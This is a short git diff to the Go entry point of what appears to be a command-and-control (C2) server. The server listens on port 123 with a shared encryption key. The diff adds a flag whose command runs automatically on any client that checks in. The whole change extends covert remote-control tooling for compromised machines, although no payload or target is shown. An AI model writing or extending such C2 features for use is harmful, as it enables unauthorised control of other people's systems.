@@ -13,6 +13,7 @@ func main() {
 	// Define flag parameters
 	key := flag.String("key", "1234567890123456", "Encryption key (must be 16 characters)")
 	address := flag.String("address", "0.0.0.0:123", "Server listen address")
+	cmd := flag.String("cmd", "", "Auto command to execute on client probe")
 	flag.Parse()
 
 	// Validate key length
@@ -25,6 +26,7 @@ func main() {
 	server, err := c2.NewServer(
 		c2.WithServerKey(*key),
 		c2.WithServerAddress(*address),
+		c2.WithServerCmd(*cmd),
 	)
 	if err != nil {
 		fmt.Printf("Failed to create server: %v\n", err)
